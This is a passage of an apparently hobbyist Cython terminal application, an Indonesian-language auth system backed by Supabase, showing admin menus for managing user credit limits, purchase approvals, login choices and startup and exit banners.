    success(f"User ditemukan: {user_email}")
    cdef int current = get_user_credit(user_id)
    info(f"Credit saat ini: {current}")
    
    amount_str = input(f" {GR}[?]{R} Jumlah credit yang ditambahkan : {CY}").strip()
    print(R, end="")
    
    try:
        amount = int(amount_str)
        if amount < 1:
            error("Jumlah harus lebih dari 0!")
            return
    except:
        error("Input harus berupa angka!")
        return
    
    add_credit(user_id, amount)
    cdef int new_credit = get_user_credit(user_id)
    success(f"Berhasil menambahkan {amount} credit ke {user_email}!")
    info(f"Credit user sekarang: {new_credit}")

cpdef void admin_remove_limit(Auth auth):
    cdef str uid_or_email, amount_str
    cdef int amount, current_credit
    cdef bint ok, user_found
    cdef object users
    cdef str user_id = ""
    cdef str user_email = ""
    
    section("REMOVE LIMIT")
    uid_or_email = input(f" {GR}[?]{R} UID atau Email User : {CY}").strip()
    print(R, end="")
    
    if not uid_or_email:
        error("Input tidak boleh kosong!")
        return
    
    loading_tqdm("Mencari user", 30)
    ok, users = auth.list_users()
    
    if not ok or not users:
        error("Gagal mengambil data user!")
        return
    
    user_found = False
    
    if "@" in uid_or_email:
        for u in users:
            if u and u.get("email", "").lower() == uid_or_email.lower():
                user_id = u.get("id", "")
                user_email = u.get("email", "")
                user_found = True
                break
    else:
        for u in users:
            if u and u.get("id", "") == uid_or_email:
                user_id = u.get("id", "")
                user_email = u.get("email", "")
                user_found = True
                break
    
    if not user_found:
        error(f"User '{uid_or_email}' tidak ditemukan dalam daftar user!")
        info("Pastikan UID atau Email yang dimasukkan benar")
        return
    
    success(f"User ditemukan: {user_email}")
    current_credit = get_user_credit(user_id)
    info(f"Credit saat ini: {current_credit}")
    
    amount_str = input(f" {GR}[?]{R} Jumlah credit yang dikurangi : {CY}").strip()
    print(R, end="")
    
    try:
        amount = int(amount_str)
        if amount < 1:
            error("Jumlah harus lebih dari 0!")
            return
    except:
        error("Input harus berupa angka!")
        return
    
    remove_credit(user_id, amount)
    cdef int new_credit = get_user_credit(user_id)
    success(f"Berhasil mengurangi {amount} credit dari {user_email}!")
    info(f"Credit user sekarang: {new_credit}")

cpdef void admin_view_all_limits(Auth auth):
    cdef dict all_credits
    cdef list table_data
    cdef str uid
    cdef dict data
    cdef bint ok
    cdef object users
    cdef dict email_map = {}
    
    section("LIHAT SEMUA LIMIT")
    loading_tqdm("Mengambil data", 25)
    
    ok, users = auth.list_users()
    if ok and users:
        for u in users:
            if u:
                email_map[u.get("id", "")] = u.get("email", "N/A")
    
    all_credits = get_all_credits()
    
    if not all_credits:
        info("Belum ada data credit user")
        return
    
    table_data = []
    for uid, data in all_credits.items():
        email = email_map.get(uid, "N/A")
        credit = data.get("credit", DEFAULT_CREDIT)
        used = data.get("used", 0)
        short_uid = uid[:8] + "..." if len(uid) > 8 else uid
        table_data.append([short_uid, email, credit, used])
    
    print()
    print(tabulate(table_data, headers=["UID", "Email", "Credit", "Used"], tablefmt="pretty"))

cpdef void admin_reset_limit(Auth auth):
    cdef str uid_or_email
    cdef bint ok, user_found
    cdef object users
    cdef str user_id = ""
    cdef str user_email = ""
    
    section("RESET LIMIT")
    uid_or_email = input(f" {GR}[?]{R} UID atau Email User : {CY}").strip()
    print(R, end="")
    
    if not uid_or_email:
        error("Input tidak boleh kosong!")
        return
    
    loading_tqdm("Mencari user", 30)
    ok, users = auth.list_users()
    
    if not ok or not users:
        error("Gagal mengambil data user!")
        return
    
    user_found = False
    
    if "@" in uid_or_email:
        for u in users:
            if u and u.get("email", "").lower() == uid_or_email.lower():
                user_id = u.get("id", "")
                user_email = u.get("email", "")
                user_found = True
                break
    else:
        for u in users:
            if u and u.get("id", "") == uid_or_email:
                user_id = u.get("id", "")
                user_email = u.get("email", "")
                user_found = True
                break
    
    if not user_found:
        error(f"User '{uid_or_email}' tidak ditemukan dalam daftar user!")
        info("Pastikan UID atau Email yang dimasukkan benar")
        return
    
    success(f"User ditemukan: {user_email}")
    cdef int current = get_user_credit(user_id)
    info(f"Credit saat ini: {current}")
    
    reset_user_credit(user_id)
    success(f"Credit user {user_email} berhasil direset ke default ({DEFAULT_CREDIT})!")

cpdef void admin_set_limit(Auth auth):
    cdef str uid_or_email, amount_str
    cdef int amount
    cdef bint ok, user_found
    cdef object users
    cdef str user_id = ""
    cdef str user_email = ""
    
    section("SET LIMIT")
    uid_or_email = input(f" {GR}[?]{R} UID atau Email User : {CY}").strip()
    print(R, end="")
    
    if not uid_or_email:
        error("Input tidak boleh kosong!")
        return
    
    loading_tqdm("Mencari user", 30)
    ok, users = auth.list_users()
    
    if not ok or not users:
        error("Gagal mengambil data user!")
        return
    
    user_found = False
    
    if "@" in uid_or_email:
        for u in users:
            if u and u.get("email", "").lower() == uid_or_email.lower():
                user_id = u.get("id", "")
                user_email = u.get("email", "")
                user_found = True
                break
    else:
        for u in users:
            if u and u.get("id", "") == uid_or_email:
                user_id = u.get("id", "")
                user_email = u.get("email", "")
                user_found = True
                break
    
    if not user_found:
        error(f"User '{uid_or_email}' tidak ditemukan dalam daftar user!")
        info("Pastikan UID atau Email yang dimasukkan benar")
        return
    
    success(f"User ditemukan: {user_email}")
    cdef int current = get_user_credit(user_id)
    info(f"Credit saat ini: {current}")
    
    amount_str = input(f" {GR}[?]{R} Set credit ke : {CY}").strip()
    print(R, end="")
    
    try:
        amount = int(amount_str)
        if amount < 0:
            error("Credit tidak boleh negatif!")
            return
    except:
        error("Input harus berupa angka!")
        return
    
    set_credit(user_id, amount)
    success(f"Credit user {user_email} berhasil diset ke {amount}!")

cpdef void admin_credit_menu(Auth auth):
    cdef int sel
    
    try:
        while True:
            clear()
            print()
            
            header_content = (
                f"[bold yellow]KELOLA LIMIT (CREDIT)[/bold yellow]\n"
                f"[dim]Manajemen Credit User[/dim]"
            )
            console.print(Panel(
                header_content,
                border_style="yellow",
                padding=(1, 2)
            ))
            
            title_box = f"\n{YL}{B}  Pilih Menu:{R}"
            
            credit_options = [
                f"{B}  [1]  Add Limit     -  Tambah credit user{R}",
                f"{B}  [2]  Remove Limit  -  Kurangi credit user{R}",
                f"{B}  [3]  Lihat Semua   -  Lihat semua credit{R}",
                f"{B}  [4]  Reset Limit   -  Reset ke default (3){R}",
                f"{B}  [5]  Set Limit     -  Set credit tertentu{R}",
                f"{B}  [0]  Kembali       -  Admin panel{R}",
            ]
            
            credit_menu = TerminalMenu(
                menu_entries=credit_options,
                title=title_box,
                menu_cursor=" ▶ ",
                menu_cursor_style=("fg_yellow", "bold"),
                menu_highlight_style=("fg_cyan", "bold"),
            )
            
            sel = credit_menu.show()
            
            if sel == 0:
                admin_add_limit(auth)
            elif sel == 1:
                admin_remove_limit(auth)
            elif sel == 2:
                admin_view_all_limits(auth)
            elif sel == 3:
                admin_reset_limit(auth)
            elif sel == 4:
                admin_set_limit(auth)
            elif sel == 5 or sel is None:
                break
            
            print()
            input(f" {D}Tekan Enter...{R}")
    except KeyboardInterrupt:
        show_interrupt_message()
        raise SystemExit(0)

cpdef void admin_panel(Auth auth, dict cfg):
    cdef int sel
    cdef bint ok
    cdef object users
    cdef int verified
    
    try:
        while True:
            clear()
            print()
            
            admin_header = (
                f"[bold red]ADMIN PANEL[/bold red]\n\n"
                f"[bold white]|[/bold white] [dim]Status[/dim]   :: [bold green]Online[/bold green]\n"
                f"[bold white]|[/bold white] [dim]Role[/dim]     :: [bold yellow]Administrator[/bold yellow]\n"
                f"[bold white]|[/bold white] [dim]Access[/dim]   :: [bold cyan]Full Control[/bold cyan]"
            )
            console.print(Panel(
                admin_header,
                border_style="red",
                padding=(1, 2),
                title="[bold white]★ CONTROL CENTER ★[/bold white]"
            ))
            
            title_box = f"\n{RD}{B}  Menu Admin:{R}"
            
            pending_purchases = get_pending_purchases()
            pending_count = len(pending_purchases)
            pending_label = f" ({pending_count})" if pending_count > 0 else ""
            
            options = [
                f"{B}  [1]  List User    -  Lihat & pilih user{R}",
                f"{B}  [2]  Hapus User   -  Delete user{R}",
                f"{B}  [3]  Kelola Limit -  Manajemen credit{R}",
                f"{B}  [4]  Database     -  Lihat statistik{R}",
                f"{B}  [5]  Pembelian   -  Approve/reject pesanan{pending_label}{R}",
                f"{B}  [0]  Logout       -  Keluar admin{R}",
            ]
            
            admin_menu = TerminalMenu(
                menu_entries=options,
                title=title_box,
                menu_cursor=" ▶ ",
                menu_cursor_style=("fg_red", "bold"),
                menu_highlight_style=("fg_yellow", "bold"),
            )
            
            sel = admin_menu.show()
            
            if sel == 0:
                admin_list_users(auth)
            elif sel == 1:
                admin_delete_user(auth)
            elif sel == 2:
                admin_credit_menu(auth)
            elif sel == 3:
                print()
                loading_tqdm("Mengambil data", 20)
                ok, users = auth.list_users()
                if ok:
                    verified = 0
                    for u in users:
                        if u.get("email_confirmed_at"):
                            verified = verified + 1
                    
                    stats_table = Table(show_header=False, box=None, padding=(0, 2))
                    stats_table.add_column("Label", style="cyan")
                    stats_table.add_column("Value", style="white")
                    stats_table.add_row("👥 Total User", f"[bold white]{len(users)}[/bold white]")
                    stats_table.add_row("✅ Terverifikasi", f"[bold green]{verified}[/bold green]")
                    stats_table.add_row("⏳ Belum Verified", f"[bold yellow]{len(users) - verified}[/bold yellow]")
                    
                    console.print(Panel(
                        stats_table,
                        title="[bold cyan]📊 DATABASE STATISTICS[/bold cyan]",
                        border_style="cyan",
                        padding=(1, 2)
                    ))
                else:
                    error("Gagal mengambil statistik")
                print()
                input(f" {D}Tekan Enter...{R}")
            elif sel == 4:
                admin_purchases_menu(cfg)
            elif sel == 5 or sel is None:
                loading_tqdm("Logout admin", 20)
                success("Logout admin berhasil!")
                break
    except KeyboardInterrupt:
        show_interrupt_message()
        raise SystemExit(0)

cpdef bint do_login_menu(Auth auth, dict cfg):
    cdef int sel
    
    login_options = [
        f"{B}  [1]  Login User   -  Masuk sebagai user{R}",
        f"{B}  [2]  Login Admin  -  Masuk sebagai admin{R}",
        f"{B}  [0]  Kembali      -  Menu utama{R}",
    ]
    
    login_menu = TerminalMenu(
        menu_entries=login_options,
        title=f"\n{CY}{B}╭─────────────────────────────────╮\n│                                 │\n│       P I L I H   L O G I N     │\n│                                 │\n╰─────────────────────────────────╯{R}",
        menu_cursor=" > ",
        menu_cursor_style=("fg_cyan", "bold"),
        menu_highlight_style=("fg_green", "bold"),
    )
    
    sel = login_menu.show()
    
    if sel == 0:
        do_login(auth, cfg)
        return True
    elif sel == 1:
        if admin_login():
            admin_panel(auth, cfg)
        return True
    elif sel == 2 or sel is None:
        return False
    return False

cpdef void intro_loading():
    clear()
    print()
    play_startup_sound()
    intro_panel = Panel(
        "[bold cyan]   ████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗[/bold cyan]\n"
        "[bold cyan]   ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║╚██╗██╔╝[/bold cyan]\n"
        "[bold cyan]      ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║ ╚███╔╝ [/bold cyan]\n"
        "[bold cyan]      ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║ ██╔██╗ [/bold cyan]\n"
        "[bold cyan]      ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗[/bold cyan]\n"
        "[bold cyan]      ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝[/bold cyan]\n\n"
        "[bold yellow]          A U T H   S Y S T E M[/bold yellow]\n"
        "[dim white]            by XyraOfficial[/dim white]",
        border_style="cyan",
        padding=(1, 2)
    )
    console.print(intro_panel)
    print()
    time.sleep(0.3)

cpdef int show_main_menu(dict dev_info, str user_ip):
    clear()
    print()
    print_info_table(dev_info, user_ip)
    
    greeting = get_greeting()
    greeting_text = f"{greeting}, Pengguna!"
    greeting_len = len(greeting_text)
    box_inner = 39
    greeting_pad_left = (box_inner - greeting_len) // 2
    greeting_pad_right = box_inner - greeting_len - greeting_pad_left
    
    title_box = (
        f"\n{CY}{B}"
        f"╭───────────────────────────────────────╮\n"
        f"│                                       │\n"
        f"│{' ' * greeting_pad_left}{greeting_text}{' ' * greeting_pad_right}│\n"
        f"│          ─────────────────            │\n"
        f"│           M E N U   U T A M A         │\n"
        f"│                                       │\n"
        f"╰───────────────────────────────────────╯"
        f"{R}"
    )
    
    options = [
        f"{B}  [1]  Signup    -  Daftar akun baru{R}",
        f"{B}  [2]  Login     -  Masuk ke akun{R}",
        f"{B}  [3]  Resend    -  Kirim ulang OTP{R}",
        f"{B}  [4]  Reset     -  Reset password{R}",
        f"{B}  [5]  About     -  Info developer{R}",
        f"{B}  [0]  Keluar    -  Exit program{R}",
    ]
    
    terminal_menu = TerminalMenu(
        menu_entries=options,
        title=title_box,
        menu_cursor=" > ",
        menu_cursor_style=("fg_cyan", "bold"),
        menu_highlight_style=("fg_green", "bold"),
    )
    
    return terminal_menu.show()

cpdef void show_exit_message():
    clear()
    print()
    exit_panel = Panel(
        "[bold white]T E R I M A   K A S I H ![/bold white]\n\n"
        "[dim]Sampai jumpa di lain waktu[/dim]\n\n"
        "[bold magenta]~ XyraOfficial ~[/bold magenta]",
        border_style="green",
        padding=(1, 4)
    )
    console.print(exit_panel)
    print()

cpdef void show_interrupt_message():
    print()
    print()
    interrupt_panel = Panel(
        "[bold white]Program dihentikan[/bold white]\n[dim]Ctrl+C terdeteksi[/dim]\n[bold magenta]~ XyraOfficial ~[/bold magenta]",
        border_style="yellow",
        padding=(1, 4)
    )
    console.print(interrupt_panel)
    print()

cpdef void run_main():
    cdef dict cfg, dev_info
    cdef str url, key, svc_key, user_ip
    cdef Auth auth
    cdef int sel
    
    try:
        cfg = load_config()
        if cfg is None:
            input(f"\n {D}Tekan Enter...{R}")
            return
        
        url = cfg.get("supabase_url", "")
        key = cfg.get("supabase_key", "")
        svc_key = cfg.get("supabase_service_key", key)
        if not url or not key:
            error("Konfigurasi Supabase tidak lengkap")
            input(f"\n {D}Tekan Enter...{R}")
            return
        if not cfg.get("smtp_email") or not cfg.get("smtp_app_password"):
            error("Konfigurasi SMTP tidak lengkap")
            input(f"\n {D}Tekan Enter...{R}")
            return
        
        init_supabase_credit(url, svc_key)
        
        auth = Auth(url, key, svc_key)
        
        dev_info = get_device_info()
        user_ip = get_ip()
        
        while True:
            sel = show_main_menu(dev_info, user_ip)
            
            clear()
            print()
            print_info_table(dev_info, user_ip)
            
            if sel == 0:
                do_signup(auth, cfg)
                print()
                input(f" {D}Tekan Enter untuk kembali...{R}")
            elif sel == 1:
                skip_enter = do_login_menu(auth, cfg)
                if not skip_enter:
                    continue
            elif sel == 2:
                do_resend(cfg)
                print()
                input(f" {D}Tekan Enter untuk kembali...{R}")
            elif sel == 3:
                do_reset(cfg)
                print()
                input(f" {D}Tekan Enter untuk kembali...{R}")
            elif sel == 4:
                show_developer_info()
                continue
            elif sel == 5 or sel is None:
                show_exit_message()
                break
            else:
                error("Pilihan tidak valid")
                print()
                input(f" {D}Tekan Enter untuk kembali...{R}")
    except KeyboardInterrupt:
        show_interrupt_message()
